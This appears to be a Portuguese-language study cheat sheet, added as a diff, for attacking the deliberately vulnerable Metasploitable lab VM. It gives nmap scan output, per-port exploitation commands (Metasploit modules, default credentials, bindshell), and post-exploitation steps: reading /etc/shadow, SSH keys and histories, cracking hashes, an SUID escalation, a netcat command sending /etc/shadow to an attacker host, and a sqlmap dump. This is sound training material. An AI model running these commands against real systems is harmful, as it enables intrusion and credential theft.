@@ -1,0 +1,311 @@
+# ===================== # 
+#  Metasploitable.hack  #
+# ===================== #
+
+
+### Para Power Shell:
+
+# wsl --install  # (Ubunto por padrão)
+# wsl --install  -d kali-linux 
+# wsl -l -o      # --list --online
+
+
+### No WSL / Linux Debian.
+
+# sudo apt update
+# sudo apt install net-tools -y
+# sudo apt install nmap -y
+# sudo apt install aircrack-ng -y
+# sudo apt install sqlmap -y
+# sudo apt install iptables -y
+# sudo snap install metasploit-framework  # (msfconsole)
+
+
+### Scanear rede com Nmap:
+
+# sudo nmap -sn -PR 192.168.56.0/24   # Listar hosts da rede.
+		# OU 'sudo arp-scan --localnet' do Net-tools para listar ocultos pela tabela ARP.
+
+# sudo nmap -sV 192.168.56.3      # escanear um host específico: 
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-15 12:28 -03
+Nmap scan report for 10.0.0.114
+Host is up (0.00032s latency).
+Not shown: 977 closed tcp ports (reset)
+PORT     STATE SERVICE     VERSION
+21/tcp   open  ftp         vsftpd 2.3.4
+22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
+23/tcp   open  telnet      Linux telnetd
+25/tcp   open  smtp        Postfix smtpd
+53/tcp   open  domain      ISC BIND 9.4.2
+80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
+111/tcp  open  rpcbind     2 (RPC #100000)
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
+512/tcp  open  exec        netkit-rsh rexecd
+513/tcp  open  login
+514/tcp  open  tcpwrapped
+1099/tcp open  java-rmi    GNU Classpath grmiregistry
+1524/tcp open  bindshell   Metasploitable root shell
+2049/tcp open  nfs         2-4 (RPC #100003)
+2121/tcp open  ftp         ProFTPD 1.3.1
+3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
+5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
+5900/tcp open  vnc         VNC (protocol 3.3)
+6000/tcp open  X11         (access denied)
+6667/tcp open  irc         UnrealIRCd
+8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
+8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
+MAC Address: 08:00:27:A4:49:FF (Oracle VirtualBox virtual NIC)
+Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+
+# ------------------------------------------------ #
+#           Portas e Vulnerabilidades              #
+# ------------------------------------------------ #
+
+# 21 (FTP)  – vsftpd 2.3.4 Backdoor. Obs: se funcionar, você receberá um shell diretamente. 
+
+	msfconsole
+	search vsftpd    
+		# apenas para ver lista
+	use exploit/unix/ftp/vsftpd_234_backdoor
+	set RHOSTS 10.0.0.114
+	show options     
+		# apenas para ver opções
+	exploit 
+
+
+# 22 (SSH) – Credenciais fracas
+
+	ssh-keygen -R 10.0.0.114  
+		# remove a entrada antiga do IP 10.0.0.114 do arquivo known_hosts.ftp
+	ssh -oHostKeyAlgorithms=+ssh-rsa msfadmin@10.0.0.114
+		# Senha: msfadmin
+
+
+# 23 (Telnet) – Credenciais fracas
+
+	telnet 10.0.0.114
+		# Login: msfadmin
+		# Senha: msfadmin
+
+
+# 25 (SMTP) – Enumeração de usuários
+	
+	nc 10.0.0.114 25
+	VRFY root
+	VRFY msfadmin
+	...
+
+# 80 (HTTP) – Aplicações web vulneráveis
+	
+	DVWA: http://10.0.0.114/dvwa – login admin/password → upload de shell.
+	phpMyAdmin: http://10.0.0.114/phpmyadmin – root sem senha → permite executar consultas SQL e gravar arquivos.
+	TikiWiki: http://10.0.0.114/tikiwiki – credenciais padrão admin@admin.com/admin.
+	WebDAV: http://10.0.0.114/dav – pode permitir upload de shells.
+	
+	
+	
+# 139/445 (Samba) – CVE-2007-2447 (execução remota)
+	
+	msfconsole
+	use exploit/multi/samba/usermap_script
+	set RHOSTS 10.0.0.114
+	exploit
+
+
+# 512 (Rexec)  – Acesso remoto sem senha 
+
+	rlogin -l root 10.0.0.114
+		# Se pedir senha, tente em branco ou root. 
+		# Nota: pode ser necessário instalar o pacote rsh-client no Ubuntu.
+
+
+
+# 1524 (bindshell) – Shell root direto
+
+	nc 10.0.0.114 1524   # (netcat)
+	
+
+# 3306 (MySQL) – Usuário root no MySQL sem senha
+
+	mysql -h 10.0.0.114 -u root --ssl-mode=DISABLED
+
+	Comandos sql úteis:
+		show databases;
+		use dvwa;
+		select * from users;
+		describe users;
+
+
+# 5432 (PostgreSQL) – Credenciais fracas no Postgres 
+
+	PGSSLMODE=disable psql -h 10.0.0.114 -U postgres
+		# ou
+	psql "host=10.0.0.114 user=postgres sslmode=disable"
+		# Senha: (vazia ou postgres)
+
+	Comandos sql úteis:
+		SELECT datname FROM pg_database WHERE datistemplate = false;
+		\c dvwa
+		SELECT tablename FROM pg_tables WHERE schemaname = 'public';
+		SELECT * FROM users;
+
+
+# 5900 (VNC) – Sem senha ou senha fraca
+
+	vncviewer 10.0.0.114
+		# Se pedir senha, tente password ou deixe em branco.
+		# Nota: pode precisar instalar tigervnc-viewer ou similar.
+
+
+
+
+# 8180 (Tomcat) – Credenciais padrão
+	
+	msfconsole
+	use exploit/multi/http/tomcat_mgr_deploy
+	set RHOSTS 10.0.0.114
+	set RPORT 8180
+	set HttpUsername tomcat
+	set HttpPassword tomcat
+	exploit
+
+	# Caso funcione isso abre o Meterpreter = Meta-Interpreter (Meta-interpretador). É um payload especial do Metasploit que não cria um shell comum, mas sim uma "plataforma de ataque" dentro da memória da vítima, sem gravar nada no disco.
+	# Opção de comando 'shell' para terminal com comandos nativos do sistema (não root), podendo escalar privilégio.
+
+	Características:
+		Totalmente na memória (mais furtivo)
+		Comandos próprios: 'help' para listar (não precisa de binários do sistema)
+		Extensível (pode carregar módulos novos)
+		Criptografado (comunicação segura)
+
+
+
+
+
+### Para obter informações do MySQL pelo Netcat:
+
+# netcat <ip, ex.: 192.168.56.13> <porta, ex.: 1524>
+# mysql -u root -p -e "show databases;"
+# mysql -u root -p -D dvwa -e "show tables;"
+# mysql -u root -p -D dvwa -e "describe users;"
+# mysql -u root -p -D dvwa -e "select * from users where user_id ='8';"
+
+# mysql -u root -p -D dvwa -e "use dvwa; INSERT INTO users (user_id, first_name, last_name, user, password, avatar) VALUES ('8', 'Ramom', 'Mota', 'ramom', MD5('toritama'), 'http://172.16.123.129/dvwa/hackable/users/admin.jpg');"
+
+# mysql -u root -p -D dvwa -e " UPDATE users SET password = SHA1('toritama') WHERE user_id = '8';"
+
+
+
+
+
+
+### Obter outras informações e credenciais do Servidor Metasploitable (dentro do Shell/Backdoor):
+
+1. Verificar nível de acesso
+# bash:
+	whoami
+	id
+		# Se for root, o acesso é total. Caso contrário, tente escalar privilégio com 'sudo su' se tiver senhas
+		
+
+11. Escalar privilégio (caso não seja root)
+# tente:
+	sudo -l
+	uname -a                         # kernel vulnerável?
+	find / -perm -4000 2>/dev/null   # suid binaries: ver arquivos com permissão SUID (podem dar root)
+	
+		# Nmap interativo com SUID (versões antigas)
+			/usr/bin/nmap --interactive
+			nmap> !sh
+			whoami    # provavelmente mostrará 'root'
+
+2. Extraia hashes de senhas do sistema
+
+	cat /etc/passwd
+	cat /etc/shadow
+	
+	
+13. Quebrar hashes offline com John ou Hashcat (opcional):
+#Salve os hashes num arquivo hashes.txt no formato que o John espera (ex: root:$1$...:0:0:root:/root:/bin/bash ou apenas o hash com identificação). Depois:
+
+	john --format=md5crypt hashes.txt
+	john --show hashes.txt
+	
+
+12. Transferir arquivos para sua máquina
+	# No atacante:
+
+		nc -lvnp 4444 > arquivo.txt
+
+	# No Metasploitable:
+	
+		cat /etc/shadow | nc 10.0.0.100 4444
+			# ou copiar manualmente.
+
+3. Liste todos os usuários com shell
+
+	grep -E "/(bash|sh|dash|zsh)" /etc/passwd
+	
+	
+6. Arquivos de configuração de aplicações web
+	
+	DVWA: /var/www/dvwa/config/config.inc.php (contém senha do banco)
+
+	TikiWiki: /var/www/tikiwiki/db/tiki-db.php ou /var/www/tikiwiki195/db/local.php
+
+	phpMyAdmin: /etc/phpmyadmin/config.inc.php
+
+	WebDAV: verifique se há arquivos de usuários em /var/www/dav/
+
+	Comandos:
+		cat /var/www/dvwa/config/config.inc.php
+		cat /var/www/tikiwiki/db/tiki-db.php
+		cat /etc/phpmyadmin/config.inc.php
+		
+7. Históricos de usuários
+
+	cat /home/msfadmin/.bash_history
+	cat /home/user/.bash_history
+	cat /root/.bash_history
+	
+	
+8. Chaves SSH e credenciais
+
+	ls -la /home/msfadmin/.ssh/
+	cat /home/msfadmin/.ssh/id_rsa
+	cat /home/msfadmin/.ssh/authorized_keys
+	
+10. Informações de rede e vizinhança
+
+	ifconfig
+	arp -a
+	netstat -tulpn
+	route -n
+		# Isso mostra outros hosts na rede, possíveis alvos para pivoting.
+
+
+Quebrar hashes online com sites:
+
+
+Site		URL					Descrição
+CrackStation	https://crackstation.net/		Usa uma enorme lista de palavras pré-computadas	(rainbow tables). Muito eficaz para senhas comuns e fracas .
+
+OnlineHashCrack	https://www.onlinehashcrack.com/	Serviço online que tenta quebrar vários tipos de hash. Oferece opções gratuitas e pagas .
+
+MD5Decrypt	https://md5decrypt.net/			Focado em MD5, mas também suporta outros algoritmos. Simples e rápido para hashes comuns .
+
+HashKiller	https://hashkiller.co.uk/		Outra boa opção com um banco de dados extenso de hashes já quebrados .
+
+CMD5		https://www.cmd5.org/			Muito popular, especialmente para MD5. Oferece consultas gratuitas limitadas e opções pagas .
+
+
+
+---------------------------------
+
+# Atividade Metasploitable DVWA (low):
+
+sudo sqlmap -u "http://10.0.0.114/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; tz_offset=-10800; PHPSESSID=572a55176fb0af25a2a39f21441711fe" --dump -D dvwa -T users
